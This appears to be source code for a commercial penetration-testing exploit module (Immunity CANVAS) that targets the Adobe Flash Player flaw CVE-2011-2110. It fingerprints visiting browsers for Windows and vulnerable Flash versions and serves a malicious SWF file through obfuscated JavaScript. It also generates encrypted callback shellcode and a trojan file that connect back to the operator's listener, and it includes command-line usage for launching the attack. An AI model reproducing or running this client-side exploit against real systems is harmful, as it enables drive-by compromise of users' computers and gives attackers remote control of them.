#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2010
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')
from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside
from libs.jsobfuscate.jsobfuscate import JSObfuscator
import string, random
from Crypto.Cipher import XOR
import zlib
import hashlib
import binascii
import canvasengine
from libs.canvasos import canvasos
from libs.spkproxy import header,body

NAME='flash_APSB11_18'
DESCRIPTION='Adobe Flash Player vulnerability'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']='Adobe'
DOCUMENTATION['Date public']='06/14/2011'
DOCUMENTATION['References']=['http://www.adobe.com/support/security/bulletins/apsb11-18.html',
                             'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2110',
                             'http://blogs.technet.com/b/mmpc/archive/2011/07/01/a-technical-analysis-on-the-exploit-for-cve-2011-2110-adobe-flash-player-vulnerability.aspx']
DOCUMENTATION['Repeatability']='Infinite'
DOCUMENTATION['VersionsAffected']='Windows Flash Player versions 10.3.181.23 and earlier'
DOCUMENTATION['CVE Name'] = 'CVE-2011-2110'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2110'
DOCUMENTATION['Notes'] = """
This is an exploit found in the wild, targeting Windows Flash player versions 10.3.181.23 and earlier.
"""

VERSION='1.0'
PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]

PROPERTY['DELIVERY']='HTTP'

NOTES="""
IMPORTANT: Work still in progress (some improvements are coming soon)

This exploits a vulnerability existing in Flash player versions
10.3.181.14, 10.3.181.22 and 10.3.181.23.

Tested on:
Windows XP Professional SP3 and Windows 7
with IE 8, Firefox 3.6.18 and Firefox 5

Usage:
python ./exploits/clientd/clientd.py -l 192.168.1.10 -d 5555 -O server_port:8080 -O allowed_attack_modules:flash_APSB11_18 -O auto_detect_exploits:0
python commandlineInterface.py -v 17 -p5555
"""

CHANGELOG="""
"""

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        
        self.version         = 0
        self.name            = NAME 
        self.filename        = self._get_random_filename()
        self.jsfilename      = 'AC_RunActiveContent.js'
        self.swffilename     = 'Resources/CVE_2011_2110/APSB11_18.swf'
        self.trojan_filename = self._get_random_filename(extension="txt")
        self.language        = "" #"en-us" # uncomment this to default to English version
        self.plugin_info     = None # we want clientd to give us a plugin dict
        self.refresh_rate    = 30
        self.xorer           = XOR.new("\x5a")
        self.jsObfuscator    = JSObfuscator()
        self.jsObfuscator.xorKeyFromCookie("SessionID")
        self.supports_dns_mosdef = True
        
        
    def random_dummy_string(self, prefix=""):
        h = hashlib.new('sha1')
        h.update(str(random.random() * 10).replace('.', ''))
        retval = h.hexdigest()
        retval = '%s%.5s' % (prefix, retval)
        return retval
    
    def _get_random_filename(self, length=8, extension="html"):
        values = [ random.choice(string.uppercase) for x in range(length) ]
        values.append(".%s" % extension)
        return "".join(values) 
    
    def check_flash_version(self, ver, major, minor, build):
        """
        Returns True if flash version is one of these:
        10.3.181.14
        10.3.181.22
        10.3.181.23
        """
        self.log("checking version %s %s %s %s" % (ver, major, minor, build))
        return  ( (ver, major, minor, build) in ( ('10','3','181','14'),
                                                  ('10','3','181','22'),
                                                  ('10','3','181','23') ) )
            
        
    def is_vulnerable(self, info_dict):
        """
        Check to make sure this is something we want to run.
        Target platform must be Windows and Flash player version a valid one
        """
        ret = 0
        if "plugins" in info_dict:
            
            if "windows" in info_dict['user_agent'].lower() or\
               "win" in info_dict['plugins']['platform'].lower():
                self.log("Target platform is Windows!")
                
                # the format of the flash version can be different depending on the client
                if "MSIE" in info_dict['user_agent']:
                    version = info_dict['plugins'].get('IE Flash', None)
                    # expected format "WIN 10.3.181.23"
                    if version is not None:
                        version = version.split()[1]
                        ver, major, minor, build = version.split('.')
                        if self.check_flash_version(ver, major, minor, build):
                            ret = 90
                else:
                    version = info_dict['plugins'].get('Shockwave Flash', None)
                    # expected format "Shockwave Flash 10.3 r181"
                    # In this case we cannot know for sure if that is affected by our exploit
                    # but if it starts with 10.3.181 or less we assume it is vulnerable
                    if version is not None:
                        version = version.split()[2:]
                        ver, major = version[0].split('.')
                        minor = version[1].strip('r')
                        if self.check_flash_version(ver, major, minor, '22'):
                            ret = 40
                        
                self.log("Flash version found: %s" % version)
                if ret != 0:
                    self.log("Flash player version seems to be vulnerable!")
        else:
            self.log("Target seems not to have Flash player installed. Assuming is not vulnerable")
        
        return ret
    
    def _encrypt(self, data):
        return self.xorer.encrypt(zlib.compress(data))
    
    def _decrypt(self, data):
        #not really needed...
        return self.xorer.decrypt(zlib.decompress(data))
        
    
        
    def makeJS(self):
        js="""//v1.7
// Flash Player Version Detection
// Detect Client Browser type
// Copyright 2005-2007 Adobe Systems Incorporated.  All rights reserved.
var isIE  = (navigator.appVersion.indexOf("MSIE") != -1) ? true : false;
var isWin = (navigator.appVersion.toLowerCase().indexOf("win") != -1) ? true : false;
var isOpera = (navigator.userAgent.indexOf("Opera") != -1) ? true : false;

function ControlVersion()
{
          var version;
          var axo;
          var e;

          // NOTE : new ActiveXObject(strFoo) throws an exception if strFoo isn't in the registry

          try {
          // version will be set for 7.X or greater players
          axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.7");
          version = axo.GetVariable("$version");
          } catch (e) {
          }

          if (!version)
          {
          try {
          // version will be set for 6.X players only
          axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.6");

          // installed player is some revision of 6.0
          // GetVariable("$version") crashes for versions 6.0.22 through 6.0.29,
          // so we have to be careful. 

          // default to the first public version
          version = "WIN 6,0,21,0";

          // throws if AllowScripAccess does not exist (introduced in 6.0r47)		
          axo.AllowScriptAccess = "always";

          // safe to call for 6.0r47 or greater
          version = axo.GetVariable("$version");

          } catch (e) {
          }
          }

          if (!version)
          {
          try {
          // version will be set for 4.X or 5.X player
          axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.3");
          version = axo.GetVariable("$version");
          } catch (e) {
          }
          }

          if (!version)
          {
          try {
          // version will be set for 3.X player
          axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.3");
          version = "WIN 3,0,18,0";
          } catch (e) {
          }
          }

          if (!version)
          {
          try {
          // version will be set for 2.X player
          axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash");
          version = "WIN 2,0,0,11";
          } catch (e) {
          version = -1;
          }
          }

          return version;
}

// JavaScript helper required to detect Flash Player PlugIn version information
function GetSwfVer(){
          // NS/Opera version >= 3 check for Flash plugin in plugin array
          var flashVer = -1;

          if (navigator.plugins != null && navigator.plugins.length > 0) {
          if (navigator.plugins["Shockwave Flash 2.0"] || navigator.plugins["Shockwave Flash"]) {
          var swVer2 = navigator.plugins["Shockwave Flash 2.0"] ? " 2.0" : "";
          var flashDescription = navigator.plugins["Shockwave Flash" + swVer2].description;
          var descArray = flashDescription.split(" ");
          var tempArrayMajor = descArray[2].split(".");			
          var versionMajor = tempArrayMajor[0];
          var versionMinor = tempArrayMajor[1];
          var versionRevision = descArray[3];
          if (versionRevision == "") {
          versionRevision = descArray[4];
          }
          if (versionRevision[0] == "d") {
          versionRevision = versionRevision.substring(1);
          } else if (versionRevision[0] == "r") {
          versionRevision = versionRevision.substring(1);
          if (versionRevision.indexOf("d") > 0) {
          versionRevision = versionRevision.substring(0, versionRevision.indexOf("d"));
          }
          }
          var flashVer = versionMajor + "." + versionMinor + "." + versionRevision;
          }
          }
          // MSN/WebTV 2.6 supports Flash 4
          else if (navigator.userAgent.toLowerCase().indexOf("webtv/2.6") != -1) flashVer = 4;
          // WebTV 2.5 supports Flash 3
          else if (navigator.userAgent.toLowerCase().indexOf("webtv/2.5") != -1) flashVer = 3;
          // older WebTV supports Flash 2
          else if (navigator.userAgent.toLowerCase().indexOf("webtv") != -1) flashVer = 2;
          else if ( isIE && isWin && !isOpera ) {
          flashVer = ControlVersion();
          }	
          return flashVer;
}

// When called with reqMajorVer, reqMinorVer, reqRevision returns true if that version or greater is available
function DetectFlashVer(reqMajorVer, reqMinorVer, reqRevision)
{
          versionStr = GetSwfVer();
          if (versionStr == -1 ) {
          return false;
          } else if (versionStr != 0) {
          if(isIE && isWin && !isOpera) {
          // Given "WIN 2,0,0,11"
          tempArray         = versionStr.split(" "); 	// ["WIN", "2,0,0,11"]
          tempString        = tempArray[1];			// "2,0,0,11"
          versionArray      = tempString.split(",");	// ['2', '0', '0', '11']
          } else {
          versionArray      = versionStr.split(".");
          }
          var versionMajor      = versionArray[0];
          var versionMinor      = versionArray[1];
          var versionRevision   = versionArray[2];

          // is the major.revision >= requested major.revision AND the minor version >= requested minor
          if (versionMajor > parseFloat(reqMajorVer)) {
          return true;
          } else if (versionMajor == parseFloat(reqMajorVer)) {
          if (versionMinor > parseFloat(reqMinorVer))
          return true;
          else if (versionMinor == parseFloat(reqMinorVer)) {
          if (versionRevision >= parseFloat(reqRevision))
          return true;
          }
          }
          return false;
          }
}

function AC_AddExtension(src, ext)
{
          if (src.indexOf('?') != -1)
          return src.replace(/\?/, ext+'?'); 
          else
          return src + ext;
}

function AC_Generateobj(objAttrs, params, embedAttrs) 
{ 
          var str = '';
          if (isIE && isWin && !isOpera)
          {
          str += '<object ';
          for (var i in objAttrs)
          {
          str += i + '="' + objAttrs[i] + '" ';
          }
          str += '>';
          for (var i in params)
          {
          str += '<param name="' + i + '" value="' + params[i] + '" /> ';
          }
          str += '</object>';
          }
          else
          {
          str += '<embed ';
          for (var i in embedAttrs)
          {
          str += i + '="' + embedAttrs[i] + '" ';
          }
          str += '> </embed>';
          }

          document.write(str);
}

function AC_FL_RunContent(){
          var ret = 
          AC_GetArgs
          (  arguments, ".swf", "movie", "clsid:d27cdb6e-ae6d-11cf-96b8-444553540000"
          , "application/x-shockwave-flash"
          );
          AC_Generateobj(ret.objAttrs, ret.params, ret.embedAttrs);
}

function AC_SW_RunContent(){
          var ret = 
          AC_GetArgs
          (  arguments, ".dcr", "src", "clsid:166B1BCA-3F9C-11CF-8075-444553540000"
          , null
          );
          AC_Generateobj(ret.objAttrs, ret.params, ret.embedAttrs);
}

function AC_GetArgs(args, ext, srcParamName, classid, mimeType){
          var ret = new Object();
          ret.embedAttrs = new Object();
          ret.params = new Object();
          ret.objAttrs = new Object();
          for (var i=0; i < args.length; i=i+2){
          var currArg = args[i].toLowerCase();    

          switch (currArg){	
          case "classid":
          break;
          case "pluginspage":
          ret.embedAttrs[args[i]] = args[i+1];
          break;
          case "src":
          case "movie":	
          args[i+1] = AC_AddExtension(args[i+1], ext);
          ret.embedAttrs["src"] = args[i+1];
          ret.params[srcParamName] = args[i+1];
          break;
          case "onafterupdate":
          case "onbeforeupdate":
          case "onblur":
          case "oncellchange":
          case "onclick":
          case "ondblclick":
          case "ondrag":
          case "ondragend":
          case "ondragenter":
          case "ondragleave":
          case "ondragover":
          case "ondrop":
          case "onfinish":
          case "onfocus":
          case "onhelp":
          case "onmousedown":
          case "onmouseup":
          case "onmouseover":
          case "onmousemove":
          case "onmouseout":
          case "onkeypress":
          case "onkeydown":
          case "onkeyup":
          case "onload":
          case "onlosecapture":
          case "onpropertychange":
          case "onreadystatechange":
          case "onrowsdelete":
          case "onrowenter":
          case "onrowexit":
          case "onrowsinserted":
          case "onstart":
          case "onscroll":
          case "onbeforeeditfocus":
          case "onactivate":
          case "onbeforedeactivate":
          case "ondeactivate":
          case "type":
          case "codebase":
          case "id":
          ret.objAttrs[args[i]] = args[i+1];
          break;
          case "width":
          case "height":
          case "align":
          case "vspace": 
          case "hspace":
          case "class":
          case "title":
          case "accesskey":
          case "name":
          case "tabindex":
          ret.embedAttrs[args[i]] = ret.objAttrs[args[i]] = args[i+1];
          break;
          default:
          ret.embedAttrs[args[i]] = ret.params[args[i]] = args[i+1];
          }
          }
          ret.objAttrs["classid"] = classid;
          if (mimeType) ret.embedAttrs["type"] = mimeType;
          return ret;
}
"""
        return js

    def makefile(self):
        """
        Makes the exploit HTML
        """
        self.getArgs()

        
        filedata="""<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
    <title>Test</title>
    <script language="javascript">AC_FL_RunContent = 0;</script>
    <script src="AC_RunActiveContent.js" language="javascript"></script>
    </head>
    <body>         
    <script language="JavaScript">
    """
        script = """
    if (AC_FL_RunContent == 0) {
      alert("This page requires AC_RunActiveContent.js.");
    } else {
      AC_FL_RunContent(
        'codebase', 'http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,0,0',
        'width', '550',
        'height', '400',
        'src', 'SWFBASENAME',
        'quality', 'high',
        'pluginspage', 'http://www.macromedia.com/go/getflashplayer',
        'align', 'middle',
        'play', 'true',
        'loop', 'true',
        'scale', 'showall',
        'wmode', 'window',
        'devicefont', 'false',
        'id', 'SWFBASENAME',
        'bgcolor', '#ffffff',
        'name', 'SWFBASENAME',
        'menu', 'true',
        'allowFullScreen', 'false',
        'allowScriptAccess','sameDomain',
        'movie', 'SWFBASENAME',
        'salign', ''
      ); //end AC code
    }
    
"""
        script = script.replace('SWFBASENAME',self.swffilename[:self.swffilename.find('.')])
        filedata += self.jsObfuscator.obfuscate(script)
        #filedata += script
        
        filedata += """
    </script>  
    <noscript>
        <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000"
                codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,0,0"
                width="100%" height="100%" id="index" align="middle">
            <param name="allowScriptAccess" value="sameDomain" />
            <param name="allowFullScreen" value="true" />
            <param name="movie" value="SWFFILENAME" />
            <param name="quality" value="high" />
            <param name="bgcolor" value="#000000" />
            
            <embed src="SWFFILENAME" quality="high" bgcolor="#ffffff" width="100%"
                   height="100%" name="index" align="middle" allowScriptAccess="sameDomain"
                   allowFullScreen="true" type="application/x-shockwave-flash"
                   pluginspage="http://www.macromedia.com/go/getflashplayer" />
        </object>
    </noscript>
  </body>
</html>
"""
        filedata = filedata.replace('SWFFILENAME',self.swffilename)
        
        return filedata

    def makeSWF(self):
        f = open(self.swffilename, 'rb+')
        swf = f.read()
        f.close()
        return swf
    
    
    def createShellcode(self):
        before_shellcode="""
subl $0x2800, %esp
leal 0x1400(%esp),%edi
mov %ebx,(%edi)
mov %esi,0x4(%edi)
mov %edi,0x8(%edi)
mov %esp,0xc(%edi)
mov %ebp,0x10(%edi)
"""
        continuation_code="""
leal -0x1628(%ebx),%eax       
mov (%eax),%ebx
mov 0x4(%eax),%esi
mov 0x8(%eax),%edi
mov 0xc(%eax),%esp
mov 0x10(%eax),%ebp
mov %esi, %esp
mov $0x6, %eax
ret
"""
        injectme = self.createWin32Shellcode_universal(self.badstring, self.callback.ip, self.callback.port)

        if not self.DNSMOSDEF:
            sc = shellcodeGenerator.win32()
            sc.vProtectSelf=False
            sc.vAllocSelf = False
            sc.addAttr("findeipnoesp", {"subespval": 0})
            sc.addAttr("InjectToSelf", { "injectme" : injectme, "customexit" : continuation_code })
            self.shellcode  = mosdef.assemble(before_shellcode, "x86") + sc.get()

        else:
            import shellcode.standalone.windows.payloads as payloads

            p = payloads.payloads()
            cd = "C000.00.%s.ms11003.com" % (self.random_dummy_string())
            dns = p.dns_proxy(cd, self.callback.ip) #we'll need to tweak the domain
            dns = p.assemble(dns)

            sc = shellcodeGenerator.win32()
            sc.addAttr("findeipnoesp", {"subespval": 0})                       
            sc.addAttr("InjectToSelf", { "injectme" : dns, "customexit" : continuation_code })
            self.shellcode  = mosdef.assemble(before_shellcode, "x86") + sc.get()
            
        return len(self.shellcode)


    def makesploit(self, clientheader, clientbody):
        
        
        self.log("\n---------------\nmakesploit - URL = %s\n---------------\n" % clientheader.URL)
        
        h=header('SERVER')
        b=body()

        if self.plugin_info:
            info_dict = self.plugin_info

            self.log("We got a plugin info for this target - thanks clientd!")
            if self.is_vulnerable(info_dict):
                self.log("This client is most likely vulnerable!")
            else:
                self.log("Bailing on this client as it is not likely to be vulnerable.")
                return None, None
        else:
            # if there is no info about plugins, at least we can filter using
            # the user-agent making sure target is Windows
            useragent = clientheader.getStrValue(['User-Agent'])
            self.log("User-Agent = %s" % useragent)
            if "windows" in useragent.lower():
                self.log("This client is likely to be vulnerable!")
            else:
                self.log("Bailing on this client as it is not likely to be vulnerable.")
                return None, None
            
        if clientheader.URL.count(self.filename):
            self.log('Serving HTML file')
            sploitstring=self.makefile()
            b.setBody(sploitstring)
            h.addHeader('Content-Type','text/html')
            h.addHeader('Set-Cookie','SessionID=%d' % self.jsObfuscator.getXORKey())
            
        elif clientheader.URL.count(self.jsfilename):
            self.log('Serving JS file')
            b.setBody(self.makeJS())
            h.addHeader('Content-Type','text/javascript')
        
        elif clientheader.URL.count(self.swffilename):
            self.log('Serving SWF file')
            b.setBody(self.makeSWF())
            h.addHeader('Content-Type','application/x-shockwave-flash')

        elif clientheader.URL.count("code"):
            self.createShellcode()                      
            h.addHeader('Content-Type','application/octet-stream')
            b.setBody(self._encrypt(self.shellcode))
  
        else:
            self.log('redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')
            
        return h,b

    def neededListenerTypes(self):
        return self.clientSideListenerTypes()
        
    def getArgs(self):
        self.host=self.target.interface
        self.getarg("filename")
        self.getarg("trojan_filename")
        return
        
    def run(self):
        self.getArgs()
        
        # Build the html that triggers the vulnerability
        filedata = self.makefile()
        self.log('Opening %s for output' % self.filename)
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('Wrote exploit HTML to %s' % self.filename)
        
        mosdeftrojan = self.makeTrojan()
        if mosdeftrojan is None:
            self.log("Failed to build Universal MOSDEF Trojan")
            return 0
        else:
            fd=file(self.trojan_filename,'wb+')
            fd.write(mosdeftrojan)
            fd.close()
            self.log('Wrote Universal MOSDEF Trojan to %s' % self.trojan_filename)
        
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
